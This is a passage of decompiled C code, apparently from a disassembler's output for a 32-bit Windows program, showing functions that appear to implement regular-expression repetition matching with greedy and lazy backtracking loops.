  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040e6eb(void *this,int param_1,int param_2)

{
  int iVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  iVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040c893(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = iVar1 - param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040c893(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040e774:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040e774;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040e77d(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040c8c3(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040c8c3(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040e808:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040e808;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040e811(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040c8d8(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040c8d8(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040e892(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  undefined4 uVar4;
  char **ppcVar5;
  uint uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar4 = FUN_00414116(pvVar2,pcVar3,ppcVar5);
    if ((char)uVar4 != '\0') {
      if (*ppcVar5 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar4 = FUN_00414116(pvVar2,pcVar3,ppcVar5);
            if ((char)uVar4 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar5 = pcVar1;
    uVar6 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
    if (ppcVar5 != (char **)0x0) {
      *ppcVar5 = pcVar1;
      ppcVar5[1] = param_1;
    }
    uVar4 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar3 + 0x10) = uVar4;
    uVar6 = CONCAT31((int3)((uint)uVar4 >> 8),1);
  }
  return uVar6;
}



uint __thiscall FUN_0040e93d(void *this,int param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040c893(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040e9d3;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040c893(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040e9d3;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040c893(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040e9d3:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040e9dc(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040c8c3(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040ea74;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040c8c3(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040ea74;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040c8c3(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040ea74:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040ea7d(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040c8d8(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040eb09:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040c8d8(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_0040eb09;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040eb0d(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  char *pcVar3;
  char *pcVar4;
  char **ppcVar5;
  undefined4 uVar6;
  
  pcVar3 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar3 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar5 = (char **)(pcVar3 + 8);
  *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar4 = (char *)FUN_00414116(pvVar2,pcVar3,ppcVar5);
  if ((char)pcVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040ebba:
      return (uint)pcVar4 & 0xffffff00;
    }
  }
  else if (*ppcVar5 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar5 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar3 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar6 = FUN_00414116(pvVar2,pcVar3,ppcVar5);
        if ((char)uVar6 == '\0') {
          *ppcVar5 = pcVar1;
          pcVar4 = pcVar1;
          goto LAB_0040ebba;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar5 = (char **)FUN_0040c014(*(void **)(pcVar3 + 0x20),8);
  if (ppcVar5 != (char **)0x0) {
    *ppcVar5 = pcVar1;
    ppcVar5[1] = param_1;
  }
  uVar6 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar3 + 0x10) = uVar6;
  return CONCAT31((int3)((uint)uVar6 >> 8),1);
}



uint __thiscall FUN_0040ebbe(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040c8d8(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040ec1f(void *this,int param_1)

{
  void *this_00;
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar2 = FUN_00414116(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      uVar2 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar2;
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040ec8d(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040c9f7(param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040c9f7(param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040ed16:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040ed16;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040ed1f(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  char *in_EAX;
  undefined4 uVar2;
  uint uVar3;
  char *pcVar4;
  
  pcVar1 = param_2;
  uVar3 = 0;
  param_2 = (char *)0x0;
  pcVar4 = pcVar1;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = (char *)FUN_004140d5(param_1,pcVar1), (char)in_EAX == '\0')) {
    pcVar4 = pcVar1 + 1;
    param_2 = pcVar1 + -(int)pcVar4;
    if (param_2 == (char *)0x0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,pcVar4);
      return uVar2;
    }
    uVar3 = 1;
    in_EAX = param_2;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = (char *)FUN_004140d5(param_1,pcVar4);
        if ((char)in_EAX != '\0') break;
        pcVar4 = pcVar4 + 1;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040eda2:
    uVar3 = (uint)in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (char *)(**(code **)(**(int **)((int)this + 4) + 4))(param_1,pcVar4),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040eda2;
      uVar3 = uVar3 - 1;
      pcVar4 = pcVar4 + (int)param_2;
    }
    uVar3 = CONCAT31((int3)((uint)in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040edab(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040ca39(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040ca39(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040ee2c(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  uint *puVar3;
  uint uVar4;
  uint uVar5;
  
  uVar5 = 0;
  uVar4 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    bVar2 = FUN_0040ca5d(*(void **)((int)this + 8),param_1);
    if (bVar2) {
      if (*(uint *)(param_1 + 8) == uVar4) {
        uVar5 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar5 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            bVar2 = FUN_0040ca5d(*(void **)((int)this + 8),param_1);
            if (!bVar2) break;
            uVar5 = uVar5 + 1;
          } while (uVar5 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar5 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar4;
    uVar4 = uVar4 & 0xffffff00;
  }
  else {
    puVar3 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar3 != (uint *)0x0) {
      *puVar3 = uVar4;
      puVar3[1] = uVar5;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar4 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar4;
}



uint __thiscall FUN_0040eead(void *this,int param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040c9f7(param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040ef43;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040c9f7(param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040ef43;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040c9f7(param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040ef43:
  return uVar1 & 0xffffff00;
}



undefined4 __thiscall FUN_0040ef4c(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  bool bVar4;
  
  uVar3 = 0;
  uVar1 = FUN_004140d5(param_1,param_2);
  if ((char)uVar1 == '\0') {
    if (param_2 + 1 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = param_2 + 1;
    }
    uVar3 = (uint)(uVar1 != 0);
    bVar4 = uVar3 < uVar1;
    while (bVar4) {
      uVar1 = FUN_004140d5(param_1,param_2);
      if ((char)uVar1 != '\0') goto LAB_0040efd5;
      param_2 = param_2 + 1;
      uVar3 = uVar3 + 1;
      bVar4 = uVar3 < *(uint *)((int)this + 0xc);
    }
  }
  else if (*(int *)((int)this + 0xc) != 0) goto LAB_0040efd5;
  while( true ) {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_004140d5(param_1,param_2);
    if ((char)uVar1 != '\0') break;
    param_2 = param_2 + 1;
  }
LAB_0040efd5:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040efde(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040ca39(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040f06a:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040ca39(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_0040f06a;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



int __thiscall FUN_0040f06e(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  bool bVar4;
  uint3 extraout_var;
  int *piVar5;
  uint3 extraout_var_00;
  uint3 uVar6;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  bVar4 = FUN_0040ca5d(*(void **)((int)this + 8),uVar3);
  if (bVar4) {
    if (*(int *)(uVar3 + 8) == iVar1) {
      param_1 = *(uint *)((int)this + 0x10);
    }
    else if (*(uint *)((int)this + 0xc) == 0) {
      *(int *)(uVar3 + 8) = iVar1;
    }
    else {
      param_1 = 1;
      if (1 < *(uint *)((int)this + 0xc)) {
        do {
          bVar4 = FUN_0040ca5d(*(void **)((int)this + 8),uVar3);
          if (!bVar4) {
            *(int *)(uVar3 + 8) = iVar1;
            uVar6 = extraout_var_00;
            goto LAB_0040f0fa;
          }
          param_1 = param_1 + 1;
        } while (param_1 < *(uint *)((int)this + 0xc));
      }
    }
  }
  else {
    uVar6 = extraout_var;
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040f0fa:
      return (uint)uVar6 << 8;
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040f0fe(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040ca39(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040f15f(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  int iVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar3 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar3 + 4) != *(int *)((int)this + 0x10)) &&
     (bVar2 = FUN_0040ca5d(*(void **)((int)this + 8),param_1), bVar2)) {
    *(int *)(iVar3 + 4) = *(int *)(iVar3 + 4) + 1;
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040f1c0(void *this,int param_1,int param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  
  iVar1 = param_2;
  uVar4 = 0;
  uVar3 = *(uint *)((int)this + 0x10);
  param_2 = 0;
  iVar5 = iVar1;
  if ((uVar3 != 0) && (*(int *)(param_1 + 4) != iVar1)) {
    iVar5 = iVar1 + 1;
    param_2 = iVar1 - iVar5;
    if (param_2 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,iVar5);
      return uVar2;
    }
    uVar4 = 1;
    if (1 < uVar3) {
      do {
        if (*(int *)(param_1 + 4) == iVar5) break;
        iVar5 = iVar5 + 1;
        uVar4 = uVar4 + 1;
      } while (uVar4 < uVar3);
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
LAB_0040f22c:
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    while (uVar3 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,iVar5), (char)uVar3 == '\0'
          ) {
      if (*(uint *)((int)this + 0xc) == uVar4) goto LAB_0040f22c;
      uVar4 = uVar4 - 1;
      iVar5 = iVar5 + param_2;
    }
    uVar3 = CONCAT31((int3)(uVar3 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040f235(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  char *pcVar5;
  
  pcVar1 = param_2;
  uVar3 = *(uint *)((int)this + 0x10);
  uVar4 = 0;
  param_2 = (char *)0x0;
  pcVar5 = pcVar1;
  if ((uVar3 != 0) && (*pcVar1 != '\0')) {
    pcVar5 = pcVar1 + 1;
    param_2 = pcVar1 + -(int)pcVar5;
    if (param_2 == (char *)0x0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,pcVar5);
      return uVar2;
    }
    uVar4 = 1;
    if (1 < uVar3) {
      do {
        if (*pcVar5 == '\0') break;
        pcVar5 = pcVar5 + 1;
        uVar4 = uVar4 + 1;
      } while (uVar4 < uVar3);
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
LAB_0040f29f:
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    while (uVar3 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,pcVar5), (char)uVar3 == '\0'
          ) {
      if (*(uint *)((int)this + 0xc) == uVar4) goto LAB_0040f29f;
      uVar4 = uVar4 - 1;
      pcVar5 = pcVar5 + (int)param_2;
    }
    uVar3 = CONCAT31((int3)(uVar3 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040f2a8(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  uint *puVar3;
  uint uVar4;
  uint uVar5;
  
  uVar5 = 0;
  uVar4 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    bVar2 = FUN_0040cb75(*(void **)((int)this + 8),param_1);
    if (bVar2) {
      if (*(uint *)(param_1 + 8) == uVar4) {
        uVar5 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar5 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
